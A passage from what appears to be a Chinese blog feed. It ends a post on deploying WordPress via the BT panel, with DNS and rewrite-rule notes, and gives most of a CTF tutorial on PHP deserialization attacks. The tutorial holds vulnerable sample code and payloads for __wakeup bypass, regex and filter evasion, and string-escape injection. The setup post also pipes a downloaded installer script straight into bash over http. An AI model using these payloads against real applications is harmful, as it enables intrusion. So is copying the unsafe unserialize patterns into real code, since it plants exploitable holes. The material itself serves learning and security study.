apt-get install ufw     //先下载ufw</span><br><span class="line"> sudo ufw allow &#x27;Apache Full&#x27;     //再配置防火墙   我失败了，但应该可以弄</span><br></pre></td></tr></table></figure><p>浏览器登录查看是否配置成功</p><p><img src="http://psych.green/wp-content/uploads/2023/07/image-20230713081329988.png"></p><p>再随便写一个PHP文件测试一下PHP配置起没有</p><h4 id="算了，用宝塔面板"><a href="#算了，用宝塔面板" class="headerlink" title="算了，用宝塔面板"></a>算了，用宝塔面板</h4><p>Debian默认没有yum命令，输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> wget -O install.sh http://download.bt.cn/install/install-ubuntu.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure><p>下载宝塔面板，记得如果端口限制了就在华为云控制台安全组设置一下</p><p>进入面板一键安装lamp</p><h3 id="安装WordPress"><a href="#安装WordPress" class="headerlink" title="安装WordPress"></a>安装WordPress</h3><p>在宝塔上一键安装，傻瓜式部署。。</p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>加了域名之后就打不开WordPress了，之前是WordPress的博客打不开现在是出了宝塔的端口开着其他端口都不能访问。初步怀疑问题有伪静态，域名解析，端口号，PHP配置</p><h4 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h4><p>域名解析需要在购买域名的控制台上，添加解析，注意www和不加www 的都要添加备案</p><p>至于dns解析，估计就是域名解析的稳定性或者效率之类的</p><p>然后再云服务器的控制台也需要添加域名，宝塔建站的时候也需要将两个域名都添加上否则会没法跳转而导致404。。</p><h4 id="伪静态"><a href="#伪静态" class="headerlink" title="伪静态"></a>伪静态</h4><p>宝塔上面很好设置伪静态，直接加一个.htaccess文件，里面填好设计好的代码</p><p>如果不是宝塔，就是手动在根目录下创建.htaccess文件，然后把代码加进去</p><p>注意apache和nginx两个服务器对应的代码和配置方法不同要注意区分；</p><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>数据库手动更改，需要在wp-config-sample.php文件中的账号密码和数据库名字改了，然后文件名改成wp-config.php。注意这个时候打开wordpress会提示数据库损坏或者出错，解决办法是在宝塔中重启mysql。如果是已经创建好的wordpress出现数据库损坏的情况首先把数据库备份再重启或者其他操作</p><h1 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h1><h4 id="伪静态-1"><a href="#伪静态-1" class="headerlink" title="伪静态"></a>伪静态</h4><p>前置知识：</p><blockquote><p>thinkPHP -&gt; 一个轻量级PHP框架</p><p>CMS -&gt; 内容管理系统（帮助使用者以“系统化”的方式“管理”网站的内容）</p><p>apache，Nginx -&gt; web服务器软件</p></blockquote><h5 id="什么是伪静态"><a href="#什么是伪静态" class="headerlink" title="什么是伪静态"></a>什么是伪静态</h5><p>伪静态是介于动态和静态之间的一种处理方式。因为动态是现实的需求，而动态又对搜索的抓取不利（因为会产生大量不同URL对应一个页面），所以在技术上采用了一种方法就是把动态URL按照<strong>正则关系进行映射</strong>，映射成类似静态的地址，因此被称之伪静态。（伪静态实质还是动态的）</p><h5 id="apache伪静态设置"><a href="#apache伪静态设置" class="headerlink" title="apache伪静态设置"></a>apache伪静态设置</h5><ul><li>mod_rewrite</li></ul><p>1、mod_rewrite 简介和配置 Rewirte主要的功能就是实现URL的跳转和隐藏真实地址，基于Perl语言的正则表达式规范。平时帮助我们实现拟静态，拟目录，域名跳转，防止盗链等</p><p>2、mod_rewrite 规则的使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> RewriteEngine on </span><br><span class="line"> RewriteCond %&#123;HTTP_HOST&#125; !^www.php100.com [NC] </span><br><span class="line"> ​</span><br><span class="line"> RewriteRule ^/(.*) http://www.php100.com/ [L]</span><br><span class="line"> ​</span><br><span class="line"> RewriteEngine on </span><br><span class="line"> RewriteRule ^/test([0-9]*).html$ /test.php?id=$1 </span><br><span class="line"> RewriteRule ^/new([0-9]*)/$ /new.php?id=$1 [R]</span><br></pre></td></tr></table></figure><p>3、mod_rewrite 规则修正符</p><ol><li>R 强制外部重定向 2) F 禁用URL,返回403HTTP状态码。 3) G 强制URL为GONE，返回410HTTP状态码。 4) P 强制使用代理转发。 5) L 表明当前规则是最后一条规则，停止分析以后规则的重写。 6) N 重新从第一条规则开始运行重写过程。 7) C 与下一条规则关联8) T&#x3D;MIME-type(force MIME type) 强制MIME类型 9) NS 只用于不是内部子请求 10) NC 不区分大小写 11) QSA 追加请求字符串 12) NE 不在输出转义特殊字符 \%3d$1 等价于 &#x3D;$1</li></ol><ul><li>.htaccess</li></ul><p>(2) .htaccess 版本伪静态规则(运行环境是Apache，或者是IIS ,ISAPI Rewrite 版本为3.0或者以上)</p><p>apache只能用.htaccess来做伪静态，而为什么IIS 的环境也要用到.htaccess呢？这是因为ISAPI Rewrite 版本为3.0或者以上只支持.htaccess的格式。</p><p>如果是老手，可以直接用ISAPI Rewrite 版本为3.0把httpd.ini转换成.htaccess格式的。</p><p>在网站根目录新建立一个.htaccess的文件，把以下代码放进去即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line"></span><br><span class="line">RewriteBase /</span><br><span class="line"></span><br><span class="line">RewriteRule ^book/([0-9]+)\.html$ modules/article/articleinfo.php?id=$1</span><br><span class="line"></span><br><span class="line">RewriteRule ^list/([0-9]+)_([0-9]+)/$ modules/article/index.php?page=$2&amp;class=$1</span><br><span class="line"></span><br><span class="line">RewriteRule ^top/([a-z]+)_([0-9]+)/$ modules/article/toplist.php?page=$2&amp;sort=$1</span><br></pre></td></tr></table></figure><h4 id="域名解析-1"><a href="#域名解析-1" class="headerlink" title="域名解析"></a>域名解析</h4><h5 id="什么是DNS域名解析？"><a href="#什么是DNS域名解析？" class="headerlink" title="什么是DNS域名解析？"></a>什么是DNS域名解析？</h5><blockquote><p>IP地址是互联网上计算机唯一的逻辑地址，通过IP地址实现不同计算机之间的相互通信，每台联网计算机都需要通过IP地址来互相联系和分别。</p><p>但由于IP地址是由一串容易混淆的数字串构成，人们很难记忆所有计算机的IP地址，这样对于我们日常工作生活访问不同网站是很困难的。基于这种背景，人们在IP地址的基础上又发展出了一种更易识别的符号化标识，这种标识由人们自行选择的字母和数字构成，相比IP地址更易被识别和记忆，逐渐代替IP地址成为互联网用户进行访问互联的主要入口。这种符号化标识就是域名。</p></blockquote><p><img src="http://psych.green/wp-content/uploads/2023/07/06f23ef6c8db46e59049279a0ce9cd20-1024x545.png"></p><p>其中前两个过程是在电脑主机完成，后面八个利用<strong>域名解析服务器</strong></p><p><img src="http://psych.green/wp-content/uploads/2023/07/image-20230301215933118.png"></p><p>我们购买域名之后域名服务商一般都会<strong>送DNS解析服务</strong>，在解析域名之前我们要知道自己的服务器的地址。我们购买的主机&#x2F;服务器都会有IP地址或者CANME地址。</p><p>本地解析服务器解析不出来就一步一步向上申请直到解析出来为止</p><h5 id="域名解析分类"><a href="#域名解析分类" class="headerlink" title="域名解析分类"></a>域名解析分类</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主要分为A记录、MX记录、CNAME记录、NS记录和TXT记录：</span><br></pre></td></tr></table></figure><p>1、A记录</p><p>A代表Address，用来指定域名对应的IP地址，如将item.taobao.com指定到115.238.23.xxx，将switch.taobao.com指定到121.14.24.xxx。A记录可以将多个域名解析到一个IP地址，但是不能将一个域名解析到多个IP地址</p><p>2、MX记录</p><p>Mail Exchange，就是可以将某个域名下的邮件服务器指向自己的Mail Server，如taobao.com域名的A记录IP地址是115.238.25.xxx，如果将MX记录设置为115.238.25.xxx，即<a href="mailto:xxx@taobao.com">xxx@taobao.com</a>的邮件路由，DNS会将邮件发送到115.238.25.xxx所在的服务器，而正常通过Web请求的话仍然解析到A记录的IP地址</p><p>3、CNAME记录</p><p>Canonical Name，即别名解析。所谓别名解析就是可以为一个域名设置一个或者多个别名，如将aaa.com解析到bbb.net、将ccc.com也解析到bbb.net，其中bbb.net分别是aaa.com和ccc.com的别名</p><p>4、NS记录</p><p>为某个域名指定DNS解析服务器，也就是这个域名由指定的IP地址的DNS服务器取解析</p><p>5、TXT记录</p><p>为某个主机名或域名设置说明，如可以为ddd.net设置TXT记录为”这是XXX的博客”这样的说明</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/2023/07/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/07/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h5 id="PHP反序列化原理"><a href="#PHP反序列化原理" class="headerlink" title="PHP反序列化原理"></a>PHP反序列化原理</h5><p>序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。那么为什么要反序列化呢？可以说，序列化就是将对象转换为可以传输，储存的数据。</p><hr><h6 id="为什么反序列化？"><a href="#为什么反序列化？" class="headerlink" title="为什么反序列化？"></a>为什么反序列化？</h6><p>1.<strong>存储需求</strong></p><p>“所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。” 在程序执行结束时，内存数据便会立即销毁，变量所储存的数据便是内存数据，而文件、数据库是“持久数据”，因此PHP序列化就是将内存的变量数据“保存”到文件中的持久数据的过程。</p><p>2.<strong>传输需求</strong></p><p>序列化说通俗点就是把一个对象变成可以传输的字符串。举个例子，json格式，这就是一种序列化，有可能就是通过array序列化而来的。而反序列化就是把那串可以传输的字符串再变回对象。</p><p>这样就让对象能够以字节流的形式传输。</p><hr><h6 id="基本函数和方法"><a href="#基本函数和方法" class="headerlink" title="基本函数和方法"></a>基本函数和方法</h6><p>对于PHP，进行反序列化时主要用到了这两种函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> serialize      -- 将对象格式化成有序的字符串</span><br><span class="line"> unserialize    -- 将字符串还原成原来的对象</span><br></pre></td></tr></table></figure><p>序列化的目的是方便数据的传输和存储，在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。</p><p>除了这两个函数，还需要了解PHP中常见的魔术方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> __construct() 当创建对象时触发，一般用于初始化对象，对变量赋初值</span><br><span class="line"> __sleep() 使用serialize()时自动触发</span><br><span class="line"> __wakeup() 使用unserialize()时自动触发</span><br><span class="line"> __destruct() 当一个对象被销毁时触发</span><br><span class="line"> __toString() 当一个类被当成字符串使用时触发，不仅是echo</span><br><span class="line"> __invoke() 当尝试以调用函数的方式调用一个对象时触发</span><br><span class="line"> __call() 在对象上下文中调用不可访问的方法时触发</span><br><span class="line"> __callStatic() 在静态上下文中调用不可访问的方法时触发</span><br><span class="line"> __get() 用于从不可访问的属性读取数据</span><br><span class="line"> __set() 用于将数据写入不可访问的属性</span><br><span class="line"> __isset() 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line"> __unset() 在不可访问的属性上使用unset()时触发</span><br></pre></td></tr></table></figure><h6 id="方法和属性"><a href="#方法和属性" class="headerlink" title="方法和属性"></a>方法和属性</h6><p>我们可以发现，把对象序列化之后的数据中并不能看到任何一个方法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> 序列化只序列化他的属性，不序列化方法。</span><br></pre></td></tr></table></figure><p>也就是说我们在利用序列化攻击的时候，也是依托类属性进行攻击。</p><p>关于属性，PHP设置了三种不同的变量<code>public,private,protected</code>，他们之间存在一些标记上的区别</p><ul><li>public无标记，变量名不变，长度不变: <code>s:2:&quot;op&quot;;i:2;</code></li><li>protected在变量名前添加标记\00_\00，长度+3: `s:5:”\00_\00op”;i:2;`</li><li>private在变量名前添加标记\00(classname)\00，长度+2+类名长度: <code>s:17:&quot;\00FileHandler_Z\00op&quot;;i:2;</code></li></ul><p>这里有一个点要注意，private变量和protected变量和public变量不一样，他们是受到保护的，所以我们在创建序列化对对象的时候不能再已经创造出对象了再来进行赋值，这是没有权限的。看下面的payload帮助理解。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> 题目：</span><br><span class="line">     class Test&#123;</span><br><span class="line">     private $test;</span><br><span class="line">     public function __construct($test)</span><br><span class="line">     &#123;</span><br><span class="line">         $this-&gt;test = $test;</span><br><span class="line">     &#125;</span><br><span class="line">     public function __destruct()</span><br><span class="line">     &#123;</span><br><span class="line">         eval($this-&gt;test);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;unserialize($_GET[&#x27;a&#x27;]);</span><br></pre></td></tr></table></figure><p><strong>正确payload</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> #payload 1</span><br><span class="line"> class Test                            </span><br><span class="line"> &#123;</span><br><span class="line">     private $test;</span><br><span class="line">     public function __construct($test)&#123;</span><br><span class="line">         $this-&gt;test = $test;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> $a = new Test(&#x27;phpinfo();&#x27;);</span><br><span class="line"> echo urlencode(serialize($a));</span><br><span class="line"> ​</span><br><span class="line"> #payload 2</span><br><span class="line"> class Test                            </span><br><span class="line"> &#123;</span><br><span class="line">     private $test;</span><br><span class="line">     public function __construct($test)&#123;</span><br><span class="line">         $this-&gt;test = &#x27;phpinfo()&#x27;;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> $a = new Test();</span><br><span class="line"> echo urlencode(serialize($a));</span><br><span class="line"> ​</span><br><span class="line"> #payload 3</span><br><span class="line"> class Test                             </span><br><span class="line"> &#123;</span><br><span class="line">     private $test=&#x27;phpinfo();&#x27;;</span><br><span class="line"> &#125;</span><br><span class="line"> $a = new Test();</span><br><span class="line"> echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p><strong>错误payload</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> class Test                             </span><br><span class="line"> &#123;</span><br><span class="line">     private $test;</span><br><span class="line">     public function __construct($test)&#123;</span><br><span class="line">         $this-&gt;test = $test;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> $a = new Test(); </span><br><span class="line"> $a-&gt;test=&#x27;phpinfo();&#x27;;          //这样操作是不行的</span><br><span class="line"> echo urlencode(serialize($a)); </span><br></pre></td></tr></table></figure><hr><h2 id="CTF应用"><a href="#CTF应用" class="headerlink" title="CTF应用"></a>CTF应用</h2><hr><h4 id="基础技巧"><a href="#基础技巧" class="headerlink" title="基础技巧"></a>基础技巧</h4><hr><h5 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="__wakeup绕过"></a>__wakeup绕过</h5><p>(CVE-2016-7124)</p><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>影响版本：<strong>PHP&gt;5.6.25 ; PHP&lt;7.0.10</strong></p><p>wakeup在使用unserialize()时自动触发，也就是说但凡涉及到反序列化的操作，都会去执行wakeup的内容，如果里面的内容对我们不友好，我们可以利用这个cve对其进行绕过</p><p> 当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</p><h6 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">     class xctf&#123;</span><br><span class="line">     public $flag = &#x27;111&#x27;;</span><br><span class="line">     public function __wakeup()&#123;</span><br><span class="line">         exit(&#x27;bad requests&#x27;);</span><br><span class="line">     &#125;</span><br><span class="line">     ?code=</span><br></pre></td></tr></table></figure><p>我们的目的是不能进入wakeup否则就直接exit了。</p><p>先构造poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">     class xctf&#123;</span><br><span class="line">     public $flag = &#x27;111&#x27;;</span><br><span class="line">     public function __wakeup()&#123;</span><br><span class="line">     exit(&#x27;bad requests&#x27;);</span><br><span class="line">     &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     $a = new xctf();</span><br><span class="line">     echo serialize($a);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p>得到：<code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></p><p>如果我们现在直接传这个就会进入wakeup，所以要绕过它，具体方法就是把最后的那个3改成4，把外面的那个1改成2.都可以绕过。</p><hr><h5 id="绕过部分正则"><a href="#绕过部分正则" class="headerlink" title="绕过部分正则"></a>绕过部分正则</h5><p>最常见的一种正则是<code>preg_match(&#39;/^O:\d+/&#39;)</code>大概意思是匹配对象字符串是不是<code>O:</code>开头:然后跟一个数字。</p><p>绕过</p><ul><li>一个很简单的绕过手法就是在数字前面加一个<code>+</code>，这样就绕过正则。正常来说正数会省略<code>+</code>，但是加上也不算错。<code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code>变成<code>O:+4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</code></li><li>serialize(array(a)) a是要反序列化的对象(这样我们序列化的开头就不是O而是a,但同时又不影响作为数组元素的$a的析构)</li></ul><hr><h5 id="利用引用绕过"><a href="#利用引用绕过" class="headerlink" title="利用引用绕过"></a>利用引用绕过</h5><p>推荐博客：<a href="https://inhann.top/2022/05/17/bypass_wakeup/">https://inhann.top/2022/05/17/bypass_wakeup&#x2F;</a></p><blockquote><p>介绍一个通用的新思路，用以绕过 pop chain 构造过程中遇到的 __wakeup()</p></blockquote><p>这适用于高版本的PHP中，此时传统的__wakeup绕过不起作用。</p><blockquote><p>原理：</p><p>a&#x3D;1;</p><p>b&#x3D;&a;</p><p>a&#x3D;a+1;</p><p>那么最后b得值也会变为2，因为b是引用赋值，b存放的是a的地址，a改变。b的地址没变但是地址对应的值改变，也就是b改变了。同理改变了b也就是通过b找到a的值把它修改了，所以修改b，a也修改了。</p></blockquote><p>在反序列化中同理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> $b = new Flag(&#x27;flag.php&#x27;);</span><br><span class="line"> $b-&gt;token=&amp;$B-&gt;token_flag;      //使得token始终等于token_flag</span><br><span class="line"> $a = new Handle($b);</span><br></pre></td></tr></table></figure><p>省略一些其他条件，得到payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> O:6:&quot;Handle&quot;:1:&#123;s:14:&quot;Handlehandle&quot;;O:4:&quot;Flag&quot;:3:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;s:32:&quot;0b794a03744a03800313ca0f2e291294&quot;;s:10:&quot;token_flag&quot;;R:4;&#125;&#125;</span><br></pre></td></tr></table></figure><p>需要注意的就是这个R，这就是类似指针的引用的对应字符。</p><p>e.g:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> highlight_file(&quot;1.php&quot;);</span><br><span class="line"> class File&#123;</span><br><span class="line"> public $filename;</span><br><span class="line"> public $secret;</span><br><span class="line"> public function __construct($filename,$secret)&#123;</span><br><span class="line"> $this-&gt;filename=$filename;</span><br><span class="line"> $this-&gt;secret=$secret;</span><br><span class="line"> &#125;</span><br><span class="line"> public function __wakeup()</span><br><span class="line"> &#123;   $this-&gt;filename=&quot;nonoflag&quot;;</span><br><span class="line"> if(isset($_GET[&#x27;secret&#x27;])) &#123;</span><br><span class="line"> $this-&gt;secret = $_GET[&#x27;secret&#x27;];</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ​</span><br><span class="line"> public function __destruct()</span><br><span class="line"> &#123;</span><br><span class="line"> //@include($this-&gt;filename);</span><br><span class="line">     echo $this-&gt;filename;</span><br><span class="line">     if ($this-&gt;filename == &#x27;flag.php&#x27;)&#123;</span><br><span class="line">         echo &#x27;You get the flag!&#x27;;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ​</span><br><span class="line"> if(isset($_GET[&#x27;flag&#x27;]))&#123;</span><br><span class="line"> $flag = $_GET[&#x27;flag&#x27;];</span><br><span class="line"> unserialize($flag);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>思路：</p><ul><li>这个题需要绕过wakeup里面的filename&#x3D;nonoflag这条语句，但是PHP版本过高，常规绕过不行</li><li>考虑引用绕过，因为wakeup里面允许get传参传入secret，所以我们用引用操作让<code>$this-&gt;$secret=&amp;$this-&gt;$filename;</code>，这样filename就一直等于secret，然后get传secret等于flag.php。实现与wakeup的对冲</li><li>从而让<code>filename=flag.php</code></li></ul><p>poc:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> class File&#123;</span><br><span class="line">     public $filename;</span><br><span class="line">     public $secret;</span><br><span class="line"> &#125;</span><br><span class="line"> $a = new File();</span><br><span class="line"> $a-&gt;secret=&amp;$a-&gt;filename;</span><br><span class="line"> echo urlencode(serialize($a));  //O:4:&quot;File&quot;:2:&#123;s:8:&quot;filename&quot;;N;s:6:&quot;secret&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure><p>最终payload：</p><ul><li>get传参：<code>O:4:&quot;File&quot;:2:&#123;s:8:&quot;filename&quot;;N;s:6:&quot;secret&quot;;R:2;&#125;</code>[url编码之后的]</li><li>secret传<code>flag.php</code></li></ul><hr><h5 id="十六进制绕过字符的过滤"><a href="#十六进制绕过字符的过滤" class="headerlink" title="十六进制绕过字符的过滤"></a>十六进制绕过字符的过滤</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> O:4:&quot;test&quot;:2:&#123;s:4:&quot;%00*%00a&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;</span><br><span class="line"> 可以写成</span><br><span class="line"> O:4:&quot;test&quot;:2:&#123;S:4:&quot;\00*\00\61&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;</span><br><span class="line"> 表示字符类型的s大写时，会被当成16进制解析。</span><br></pre></td></tr></table></figure><hr><h4 id="PHP反序列化字符串逃逸"><a href="#PHP反序列化字符串逃逸" class="headerlink" title="PHP反序列化字符串逃逸"></a>PHP反序列化字符串逃逸</h4><p>此类题目的本质就是改变序列化字符串的长度，导致反序列化漏洞 这种题目有个共同点：</p><ul><li>php序列化后的字符串经过了替换或者修改，导致字符串长度发生变化。</li><li>总是<strong>先进行序列化</strong>，再进行替换修改操作。</li></ul><hr><h6 id="过滤后字符变多"><a href="#过滤后字符变多" class="headerlink" title="过滤后字符变多"></a>过滤后字符变多</h6><p>例题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> function filter($str)&#123;</span><br><span class="line">     return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str);</span><br><span class="line"> &#125;</span><br><span class="line"> class A&#123;</span><br><span class="line">     public $name=&#x27;aaaa&#x27;;</span><br><span class="line">     public $pass=&#x27;123456&#x27;;</span><br><span class="line"> &#125;</span><br><span class="line"> $AA=new A();</span><br><span class="line">  echo serialize($AA).&quot;\n&quot;;$res=filter(serialize($AA));</span><br><span class="line"> $c=unserialize($res);</span><br><span class="line"> echo $c-&gt;pass;</span><br><span class="line"> echo &#x27;&lt;/br&gt;&#x27;;</span><br><span class="line"> echo $c-&gt;name;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p>分析：</p><ul><li>把bb换成ccc，字符串就长了，但是字符串长度在filter函数进行前就确定好了，【根据原来是bb的时候就确定了】</li><li>这个时候我们每构造一个bb，设定的字符串长度就会比实际的字符串少一个，也就是name中有一个字符逃逸出来了</li><li>如果我们尝试先对name的值进行闭合<code>&quot;;&#125;</code>，然后构造一下就能修改pass的值，使得通过构造name来取修改了pass</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> function filter($str)&#123;</span><br><span class="line">     return str_replace(&#x27;bb&#x27;, &#x27;ccc&#x27;, $str);</span><br><span class="line"> &#125;</span><br><span class="line"> class A&#123;</span><br><span class="line">     public $name=&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;;</span><br><span class="line">     public $pass=&#x27;123456&#x27;;</span><br><span class="line"> &#125;</span><br><span class="line"> $AA=new A();</span><br><span class="line">  echo serialize($AA).&quot;\n&quot;;$res=filter(serialize($AA));</span><br><span class="line"> 